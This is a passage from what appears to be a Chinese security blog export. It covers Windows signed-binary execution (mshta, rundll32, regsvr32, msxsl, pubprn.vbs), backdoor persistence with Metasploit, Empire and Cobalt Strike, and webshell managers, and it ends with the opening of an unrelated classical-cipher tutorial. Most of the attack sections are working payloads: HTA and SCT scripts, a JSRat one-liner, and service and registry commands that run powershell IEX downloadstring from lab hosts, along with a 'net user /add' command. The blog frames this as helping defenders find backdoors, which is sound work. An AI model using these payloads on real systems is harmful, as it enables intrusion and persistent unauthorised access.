src="/image/media/2022/secops/20200413-10.png"></p><h3 id="0x11-mshta"><a href="#0x11-mshta" class="headerlink" title="0x11 mshta"></a><strong>0x11 mshta</strong></h3><p>mshta用于执行.hta文件，而hta是HTML Applocation 的缩写，也就是HTML应用程序。而hta中也支持VBS。所以我们可以利用hta来下载文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta http://192.168.28.128/run.hta</span><br></pre></td></tr></table></figure><p>run.hta内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;HTML&gt; </span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;</span><br><span class="line">&lt;HEAD&gt; </span><br><span class="line">&lt;script language=&quot;VBScript&quot;&gt;</span><br><span class="line">Window.ReSizeTo 0, 0</span><br><span class="line">Window.moveTo -2000,-2000</span><br><span class="line">Set objShell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">objShell.Run &quot;cmd.exe /c net user test password /add&quot; // 这里填写命令</span><br><span class="line">self.close</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">demo</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/HEAD&gt; </span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/secops/20200413-11.png"></p><h3 id="0x12-rundll32"><a href="#0x12-rundll32" class="headerlink" title="0x12 rundll32"></a><strong>0x12 rundll32</strong></h3><p>其实还是依赖于WScript.shell这个组件，在这里我们使用JSRat来做演示，JSRat是一个命令和控制框架，仅为rundll32.exe和regsvr32.exe生成恶意程序。</p><p>项目地址：<a href="https://github.com/Hood3dRob1n/JSRat-Py.git">https://github.com/Hood3dRob1n/JSRat-Py.git</a></p><p>步骤一：开始运行JSRat，监听本地8888端口。</p><p><img src="/image/media/2022/secops/20200413-12-1.png"></p><p>步骤二：通过url访问，可以查看恶意代码。</p><p><img src="/image/media/2022/secops/20200413-12-2.png"></p><p>复制代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://192.168.28.131:8888/connect&quot;,false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);&#125;</span><br></pre></td></tr></table></figure><p>步骤三：在受害者PC运行该代码，将成功返回一个会话，如下图所示：</p><p><img src="/image/media/2022/secops/20200413-12-3.png"></p><h3 id="0x13-regsvr32"><a href="#0x13-regsvr32" class="headerlink" title="**0x13 regsvr32 **"></a>**0x13 regsvr32 **</h3><p>Regsvr32命令用于注册COM组件，是Windows系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行</p><p>在目标机上执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32.exe /u /n /s /i:http://192.168.28.131:8888/file.sct scrobj.dll</span><br></pre></td></tr></table></figure><p>可以通过自己构造.sct文件，去下载执行我们的程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?XML version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;scriptlet&gt;</span><br><span class="line">&lt;registration</span><br><span class="line">    progid=&quot;ShortJSRAT&quot;</span><br><span class="line">    classid=&quot;&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;&quot; &gt;</span><br><span class="line">    &lt;script language=&quot;JScript&quot;&gt;</span><br><span class="line">        &lt;![CDATA[</span><br><span class="line">            ps  = &quot;cmd.exe /c calc.exe&quot;;</span><br><span class="line">            new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true);</span><br><span class="line">        ]]&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/registration&gt;</span><br><span class="line">&lt;/scriptlet&gt;</span><br></pre></td></tr></table></figure><p>执行命令，成功弹计算器：</p><p><img src="/image/media/2022/secops/20200413-13.png"></p><h3 id="0x14-MSXSL-EXE"><a href="#0x14-MSXSL-EXE" class="headerlink" title="0x14 MSXSL.EXE"></a><strong>0x14 MSXSL.EXE</strong></h3><p>msxsl.exe是微软用于命令行下处理XSL的一个程序，所以通过他，我们可以执行JavaScript进而执行系统命令。</p><p>下载地址为：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=21714">https://www.microsoft.com/en-us/download/details.aspx?id=21714</a></p><p>msxsl.exe 需要接受两个文件，XML及XSL文件，可以远程加载，具体方式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msxsl http://192.168.28.128/scripts/demo.xml http://192.168.28.128/scripts/exec.xsl</span><br></pre></td></tr></table></figure><p>demo.xml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;exec.xsl&quot; ?&gt;</span><br><span class="line">&lt;customers&gt;</span><br><span class="line">&lt;customer&gt;</span><br><span class="line">&lt;name&gt;Microsoft&lt;/name&gt;</span><br><span class="line">&lt;/customer&gt;</span><br><span class="line">&lt;/customers&gt;</span><br></pre></td></tr></table></figure><p>exec.xsl</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span><br><span class="line">&lt;xsl:stylesheet version=&quot;1.0&quot;</span><br><span class="line">xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;</span><br><span class="line">xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot;</span><br><span class="line">xmlns:user=&quot;http://mycompany.com/mynamespace&quot;&gt;</span><br><span class="line">  </span><br><span class="line">&lt;msxsl:script language=&quot;JScript&quot; implements-prefix=&quot;user&quot;&gt;</span><br><span class="line">   function xml(nodelist) &#123;</span><br><span class="line">var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c calc.exe&quot;);</span><br><span class="line">   return nodelist.nextNode().xml;</span><br><span class="line">  </span><br><span class="line">   &#125;</span><br><span class="line">&lt;/msxsl:script&gt;</span><br><span class="line">&lt;xsl:template match=&quot;/&quot;&gt;</span><br><span class="line">   &lt;xsl:value-of select=&quot;user:xml(.)&quot;/&gt;</span><br><span class="line">&lt;/xsl:template&gt;</span><br><span class="line">&lt;/xsl:stylesheet&gt;</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/secops/20200413-14.png"></p><h3 id="0x15-pubprn-vbs"><a href="#0x15-pubprn-vbs" class="headerlink" title="0x15 pubprn.vbs"></a><strong>0x15 pubprn.vbs</strong></h3><p>在Windows 7以上版本存在一个名为PubPrn.vbs的微软已签名WSH脚本，其位于C:\Windows\System32\Printing_Admin_Scripts\en-US，仔细观察该脚本可以发现其显然是由用户提供输入（通过命令行参数），之后再将参数传递给GetObject()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs&quot; 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct</span><br></pre></td></tr></table></figure><p>test.sct</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?XML version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;scriptlet&gt;</span><br><span class="line">&lt;registration</span><br><span class="line">    description=&quot;Bandit&quot;</span><br><span class="line">    progid=&quot;Bandit&quot;</span><br><span class="line">    version=&quot;1.00&quot;</span><br><span class="line">    classid=&quot;&#123;AAAA1111-0000-0000-0000-0000FEEDACDC&#125;&quot;</span><br><span class="line">    remotable=&quot;true&quot;</span><br><span class="line">&gt;</span><br><span class="line">&lt;/registration&gt;</span><br><span class="line">&lt;script language=&quot;JScript&quot;&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;);</span><br><span class="line">]]&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/scriptlet&gt;</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/secops/20200413-15.png"></p><h2 id="三大渗透测试框架权限维持技术"><a href="#三大渗透测试框架权限维持技术" class="headerlink" title="三大渗透测试框架权限维持技术"></a>三大渗透测试框架权限维持技术</h2><h3 id="0x00-前言-2"><a href="#0x00-前言-2" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>在渗透测试中，有三个非常经典的渗透测试框架—-Metasploit、Empire、Cobalt Strike。</p><p>那么，通过漏洞获取到目标主机权限后，如何利用框架获得持久性权限呢？</p><h3 id="0x01-MSF权限维持"><a href="#0x01-MSF权限维持" class="headerlink" title="0x01 MSF权限维持"></a>0x01 MSF权限维持</h3><p>使用MSF维持权限的前提是先获得一个<em>meterpreter</em>  shell，通过<em>meterpreter</em> shell获取持久性shell的方法有两种：</p><p><strong>Persistence模块</strong></p><p>通过启动项启动(persistence)的方式，在目标机器上以反弹回连。</p><p><img src="/image/media/2022/secops/privilege-3-1.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-U：设置后门在用户登录后自启动。该方式会在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。推荐使用该参数；</span><br><span class="line">-X：设置后门在系统启动后自启动。该方式会在HKLM\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。由于权限问题，会导致添加失败，后门将无法启动。</span><br><span class="line">-S：作为服务自动启动代理程序（具有SYSTEM权限）</span><br></pre></td></tr></table></figure><p>生成的相关文件位置 ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 后门文件位置：</span><br><span class="line">C:\Windows\Temp</span><br><span class="line">C:\Users\Administrator\AppData\Local\Temp</span><br><span class="line"># 注册表位置：</span><br><span class="line">HKCU\Software\Microsoft\Windows\CurrentVersion\Run\</span><br><span class="line">HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/secops/privilege-3-2.png"></p><p><strong>Metsvc 模块</strong></p><p>通过服务(metsvc)启动的方式，在目标机器启动后自启动一个服务，等待连接。</p><p><img src="/image/media/2022/secops/privilege-3-3.png"></p><p>后门排查：目标主机上开启了一个Meterpreter服务。</p><p><img src="/image/media/2022/secops/privilege-3-4.png"></p><h3 id="0x02-Empire-权限维持"><a href="#0x02-Empire-权限维持" class="headerlink" title="0x02 Empire 权限维持"></a>0x02 Empire 权限维持</h3><p>Empire的persistence模块提供了18种权限维持的方法，大致可以分为四类，即</p><p><img src="/image/media/2022/secops/privilege-3-17.png"></p><table><thead><tr><th align="left">elevated（管理权限）</th><th align="left">misc（杂项）</th><th align="left">powerbreach</th><th align="left">userland（用户权限）</th></tr></thead><tbody><tr><td align="left">registry*</td><td align="left">add_netuser</td><td align="left">deaduser</td><td align="left">backdoor_lnk</td></tr><tr><td align="left">schtasks*</td><td align="left">add_sid_history*</td><td align="left">eventlog*</td><td align="left">registry</td></tr><tr><td align="left">wmi*</td><td align="left">debugger*</td><td align="left">resolver</td><td align="left">schtasks</td></tr><tr><td align="left">wmi_updater*</td><td align="left">disable_machine_acct_change*</td><td align="left"></td><td align="left"></td></tr><tr><td align="left"></td><td align="left">get_ssps</td><td align="left"></td><td align="left"></td></tr><tr><td align="left"></td><td align="left">install_ssp*</td><td align="left"></td><td align="left"></td></tr><tr><td align="left"></td><td align="left">memssp*</td><td align="left"></td><td align="left"></td></tr><tr><td align="left"></td><td align="left">skeleton_key*</td><td align="left"></td><td align="left"></td></tr></tbody></table><p><strong>注册表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(Empire: agents) &gt; agents</span><br><span class="line">(Empire: agents) &gt; interact URL3FZBV</span><br><span class="line">(Empire: URL3FZBV) &gt; usemodule persistence/elevated/registry*</span><br><span class="line">(Empire: powershell/persistence/elevated/registry) &gt; set Listener test</span><br><span class="line">(Empire: powershell/persistence/elevated/registry) &gt; execute</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/secops/privilege-3-5.png"></p><p>因为是开机启动，所以会弹个黑框，之后还会弹出注册表添加的powershell启动项的框，在注册表位置如下：</p><p><img src="/image/media/2022/secops/privilege-3-6.png"></p><p><strong>计划任务</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(Empire: agents) &gt; interact 9NZ2RWBC</span><br><span class="line">(Empire: 9NZ2RWBC) &gt; usemodule persistence/elevated/schtasks*</span><br><span class="line">(Empire: powershell/persistence/elevated/schtasks) &gt; set Listener test</span><br><span class="line">(Empire: powershell/persistence/elevated/schtasks) &gt; set DailyTime 22:50</span><br><span class="line">(Empire: powershell/persistence/elevated/schtasks) &gt; execute</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/secops/privilege-3-7.png"></p><p>在任务计划程序库可以看到-任务为Updater-启动程序如下可以到为powershell</p><p><img src="/image/media/2022/secops/privilege-3-8.png"></p><p><strong>wmi</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(Empire: agents) &gt; interact 9NZ2RWBC</span><br><span class="line">(Empire: 9NZ2RWBC) &gt; usemodule persistence/elevated/wmi</span><br><span class="line">(Empire: powershell/persistence/elevated/wmi) &gt; set Listener test</span><br><span class="line">(Empire: powershell/persistence/elevated/wmi) &gt; run</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/secops/privilege-3-9.png"></p><p>如何清除后门，最简单的方法就是使用Autoruns，选择WMI选项卡，右键就可以删除恶意后门。</p><p><img src="/image/media/2022/secops/privilege-3-10.png"></p><h3 id="0x03-Cobalt-Strike权限维持"><a href="#0x03-Cobalt-Strike权限维持" class="headerlink" title="0x03 Cobalt Strike权限维持"></a>0x03 Cobalt Strike权限维持</h3><p>通过Cobalt Strike拿到一个shell，留后门的方法有很多，下面介绍两种比较常见的无文件、自启动后门。</p><p>从Cobalt Strike菜单栏，Attacks–Web Drive-by–Scaripted Web Delivery，生成powershell后门。</p><p><img src="/image/media/2022/secops/privilege-3-11.png"></p><p>根据需要可以自己选择，填写所需参数默认端口是80（需要注意的就是不要使用重复端口），Type选择powershell。</p><p><img src="/image/media/2022/secops/privilege-3-12.png"></p><p>点击Launch后，返回powershell远程下载执行命令。</p><p><img src="/image/media/2022/secops/privilege-3-13.png"></p><p><strong>服务自启动后门</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sc create &quot;Name&quot; binpath= &quot;cmd /c start powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.28.142:8080/a&#x27;))\&quot;&quot;</span><br><span class="line">sc description  Name &quot;Just For Test&quot;   //设置服务的描述字符串</span><br><span class="line">sc config Name start= auto             //设置这个服务为自动启动 </span><br><span class="line">net start Name                         //启动服务</span><br></pre></td></tr></table></figure><p>重启服务器后，成功返回一个shell。</p><p><img src="/image/media/2022/secops/privilege-3-14.png"></p><p><strong>注册表自启动</strong></p><p>在windows启动项注册表里面添加一个木马程序路径，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt;getsystem</span><br><span class="line">beacon&gt;shell reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v &quot;Keyname&quot; /t REG_SZ /d &quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.28.142:8080/a&#x27;))\&quot;&quot; /f </span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/secops/privilege-3-15.png"></p><p> 账号注销后，重新登录，界面上会出现powershell快速闪过消失，成功返回shell。</p><p><img src="/image/media/2022/secops/privilege-3-16.png"></p><p>注册表还有哪些键值可以设置为自启动：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run </span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run </span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</span><br></pre></td></tr></table></figure><hr><h3 id="0x04-结束语"><a href="#0x04-结束语" class="headerlink" title="0x04 结束语"></a>0x04 结束语</h3><p>本文简单介绍了通过三大渗透框架进行权限维持的几种方法，了解攻击者常用的渗透框架及后门技术，有助于更好地去发现并解决服务器安全问题。</p><h2 id="常见WebShell管理工具"><a href="#常见WebShell管理工具" class="headerlink" title="常见WebShell管理工具"></a>常见WebShell管理工具</h2><p>攻击者在入侵网站时，通常要通过各种方式写入Webshell，从而获得服务器的控制权限，比如执行系统命令、读取配置文件、窃取用户数据，篡改网站页面等操作。</p><p>本文介绍十款常用的Webshell管理工具，以供你选择，你会选择哪一个？</p><hr><p><strong>1、中国菜刀(Chopper)</strong></p><p>中国菜刀是一款专业的网站管理软件，用途广泛，使用方便，小巧实用。只要支持动态脚本的网站，都可以用中国菜刀来进行管理！在非简体中文环境下使用，自动切换到英文界面。UNICODE方式编译，支持多国语言输入显示。</p><p><img src="/image/media/2022/secops/privilege-6-1.png"></p><p><strong>2、蚁剑(AntSword)</strong></p><p>AntSword是一个开放源代码，跨平台的网站管理工具，旨在满足渗透测试人员以及具有权限和/或授权的安全研究人员以及网站管理员的需求。</p><p>github项目地址：<a href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></p><p><img src="/image/media/2022/secops/privilege-6-2.png"></p><p><strong>3、C刀(Cknife)</strong></p><p>这是一款跨平台的基于配置文件的中国菜刀，把所有操作给予用户来定义。</p><p>github项目地址：<a href="https://github.com/Chora10/Cknife">https://github.com/Chora10/Cknife</a></p><p><img src="/image/media/2022/secops/privilege-6-3.png"></p><p><strong>4、冰蝎(Behinder)</strong></p><p>冰蝎”是一款动态二进制加密网站管理客户端。</p><p>github地址：<a href="https://github.com/rebeyond/Behinder">https://github.com/rebeyond/Behinder</a></p><p><img src="/image/media/2022/secops/privilege-6-4.png"></p><p><strong>5、Xise</strong></p><p>XISE WebShell管理工具。</p><p><img src="/image/media/2022/secops/privilege-6-5.png"></p><p><strong>6、Altman</strong></p><p>Altman3是一款渗透测试软件，基于.Net4.0开发，依托Eto.Form可以完美运行在Windows、Linux、Mac等多个平台。</p><p>github项目地址：<a href="https://github.com/keepwn/Altman">https://github.com/keepwn/Altman</a></p><p><img src="/image/media/2022/secops/privilege-6-6.png"></p><p><strong>7、Weevely</strong></p><p>Weevely是一种Python编写的webshell管理工具，跨平台，只支持PHP。</p><p>github项目地址：<a href="https://github.com/epinna/weevely3">https://github.com/epinna/weevely3</a></p><p>用法示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">weevely generate &lt;password&gt; &lt;path&gt;</span><br><span class="line">weevely &lt;URL&gt; &lt;password&gt; [cmd]</span><br></pre></td></tr></table></figure><p>同时，在Kali 2.0 版本下，集成了三款Web后门工具：WebaCoo、weevely、PHP Meterpreter。</p><p><img src="/image/media/2022/secops/privilege-6-7.png"></p><p><strong>8、QuasiBot</strong></p><p>QuasiBot是一款php编写的webshell管理工具，可以对webshell进行远程批量管理。</p><p>github项目地址：<a href="https://github.com/Smaash/quasibot">https://github.com/Smaash/quasibot</a></p><p><img src="/image/media/2022/secops/privilege-6-8.png"></p><p><strong>9、Webshell-Sniper</strong></p><p>这是一款基于终端的webshell管理工具，仅支持在类Unix系统上运行。</p><p>github项目地址：<a href="https://github.com/WangYihang/Webshell-Sniper">https://github.com/WangYihang/Webshell-Sniper</a></p><p>用法示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Usage : </span><br><span class="line">        python webshell-sniper.py [URL] [METHOD] [AUTH]</span><br><span class="line">Example : </span><br><span class="line">        python webshell-sniper.py http://127.0.0.1/c.php POST c</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/secops/privilege-6-9.png"></p><p><strong>10、WebshellManager</strong></p><p>一款用PHP+Mysql写的一句话WEB端管理工具，目前仅支持对PHP的一句话进行操作。</p><p>github项目地址：<a href="https://github.com/boy-hack/WebshellManager">https://github.com/boy-hack/WebshellManager</a></p><p><img src="/image/media/2022/secops/privilege-6-10.png"></p><p>收集到了一些webshell管理工具，如 hatchet、K8飞刀、lanker，欢迎补充。</p>]]></content>
      
      
      <categories>
          
          <category> 安全运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>古典密码学</title>
      <link href="/article/2022-05-06-%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
      <url>/article/2022-05-06-%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<p>学习一下古典密码学。</p><span id="more"></span><h1 id="古典密码学"><a href="#古典密码学" class="headerlink" title="古典密码学"></a>古典密码学</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">密码(Cryptology)是一种用来混淆的技术,它希望将正常的、可识别的信息转变为无法识别的信息。</span><br><span class="line">密码学(Cryptography),是一门将信息进行加密处理与传递,以及分析加密信息的学科。</span><br><span class="line"></span><br><span class="line">密码学的发展大概经历了三个阶段:古典密码阶段、近代密码阶段、现代密码阶段。</span><br><span class="line">一般来说，古典密码学是基于字符的，而现代密码学是基于二进制位的。</span><br><span class="line">古典密码阶段是指从密码的产生到发展成为近代密码之间的这段时期密码的发展历史。</span><br></pre></td></tr></table></figure><p>古典密码编码方法归根结底主要有两种，即置换和代换。</p><ul><li><p>把明文中的字母重新排列，字母本身不变，但其位置改变了，这样编成的密码称为置换密码。最简单的置换密码是把明文中的字母顺序倒过来，然后截成固定长度的字母组作为密文。</p></li><li><p>代换密码则是将明文中的字符替代成其他字符。</p></li></ul><h2 id="置换密码"><a href="#置换密码" class="headerlink" title="置换密码"></a>置换密码</h2><p>置换密码（permutation cipher）又称为换位密码（transposition cipher），是根据一定的规则重新排列明文，以便打破明文的结构特性。置换密码的特点是保持明文的所有字符不变 ，只是利用置换打乱了明文字符的位置和次序 。也就是说，改变了明文的结构，不改变明文的内容。这种密码是把明文中各字符的位置次序重新排列来得到密文的一种密码体制。</p><p>举例，我们来看一种简单的置换密码字母移位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">crypto=&#x27;abc&#x27;</span><br><span class="line">for i in range(len(crypto)):</span><br><span class="line">    print(crypto[i:]+crypto[:i])</span><br><span class="line">#abc</span><br><span class="line">#bca</span><br><span class="line">#cab</span><br></pre></td></tr></table></figure><p>可以看到我们将每个单词中的字母都向右移动了一位，我们并没有改变明文的内容，只是改变了明文的结构。</p><p>最常见的置换密码有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">周期置换密码：将明文P按固定长度m分组然后对每组按1，2…，m的某个置换重排位置从而得到密文C</span><br><span class="line">列置换密码：明文P遵照密钥的规程按列换位并且按列读出序列得到密文C</span><br><span class="line">曲路密码：明文P填入一个表中，并按照一定的曲路遍历</span><br><span class="line">栅栏密码：把文本按照一定的字数分成多个组，取每组第一个字连起来得到密文1，再取每组第二个字连起来得到密文2……最后把密文1、密文2……连成整段密文。</span><br></pre></td></tr></table></figure><h3 id="周期置换密码"><a href="#周期置换密码" class="headerlink" title="周期置换密码"></a>周期置换密码</h3><p>周期置换密码是将明文字符串P按固定的长度m进行分组，然后对每组字符串中的字符按照某个密钥重新排位的到密文C。其中密钥S包含分组长度信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">明文：P=flag&#123;012345&#125;</span><br><span class="line">加密的密钥：S=(1 5 6 2 3)</span><br><span class="line">将明文分为两组，每组6个字符，不足6个的用规定好的字符进行填充，比如空格。</span><br><span class="line">现在分组情况是 P&#x27;=flag&#123;0+12345&#125;</span><br><span class="line">对每组的字符进行加密，根据密钥S，可知将第1个字符放在第5个字符的位置，第5个字符放在第6个字符的位置，第6个字符放在第2个字符的位置，第2个字符放在第3个字符的位置，第3个字符放在第1个字符的位置,置换后P&#x27;如下：</span><br><span class="line">flag&#123;0------&gt;a0lgf&#123;</span><br><span class="line">12345&#125;------&gt;3&#125;2415</span><br><span class="line">所以得到的最终密文Pm=a0lgf&#123;3&#125;2415</span><br></pre></td></tr></table></figure><p>解密时只需得到密钥S的逆置换，把密文重新分组，按照密钥的逆置换对密文的子字符串重新排位就可以得到明文P。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">密文：P=a0lgf&#123;3&#125;2415</span><br><span class="line">加密的密钥：S=(1 5 6 2 3)</span><br><span class="line">加密的密钥逆置换S` = (1 3 2 6 5)</span><br><span class="line">对每组的字符进行加密，根据密钥逆置换，可知将第1个字符放在第3个字符的位置，第3个字符放在第2个字符的位置，第2个字符放在第6个字符的位置，第6个字符放在第5个字符的位置，第5个字符放在第1个字符的位置,置换后P&#x27;如下：</span><br><span class="line">a0lgf&#123;------&gt;flag&#123;0</span><br><span class="line">3&#125;2415------&gt;12345&#125;</span><br><span class="line">所以得到最后的原文flag&#123;012345&#125;</span><br></pre></td></tr></table></figure><h3 id="列置换密码"><a href="#列置换密码" class="headerlink" 